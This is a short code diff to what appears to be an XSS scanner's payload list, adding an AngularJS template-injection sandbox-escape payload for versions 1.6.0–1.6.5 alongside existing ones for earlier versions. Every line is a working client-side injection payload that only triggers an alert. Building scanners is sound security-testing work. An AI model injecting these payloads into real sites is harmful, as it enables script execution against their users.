@@ -10,5 +10,7 @@ xssRadar.scanner.payloads.angular = [
 //1.3.0 - 1.5.8
 "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert({id}),a')}}",
 //1.5.9 - 1.5.11
-'{{a=$root;p=[].push;c=p.call;b=p.bind;c.z=$apply;c.$eval=b;a.$$phase=0;a.$digest=toString;C=c.z(c);B=C(b,c,b);$evalAsync("v=pop();v.type=\'UnaryExpression\';v.argument=v.operator=\'alert({id})\';");n=B($$asyncQueue.pop().expression,0,a);m=B(C,0,n);p.apply=m;$eval(\'p(b.c)\');}}</body>'
+'{{a=$root;p=[].push;c=p.call;b=p.bind;c.z=$apply;c.$eval=b;a.$$phase=0;a.$digest=toString;C=c.z(c);B=C(b,c,b);$evalAsync("v=pop();v.type=\'UnaryExpression\';v.argument=v.operator=\'alert({id})\';");n=B($$asyncQueue.pop().expression,0,a);m=B(C,0,n);p.apply=m;$eval(\'p(b.c)\');}}</body>',
+//1.6.0  - 1.6.5
+"{{[].pop.constructor('alert(1)')()}}"
 ]
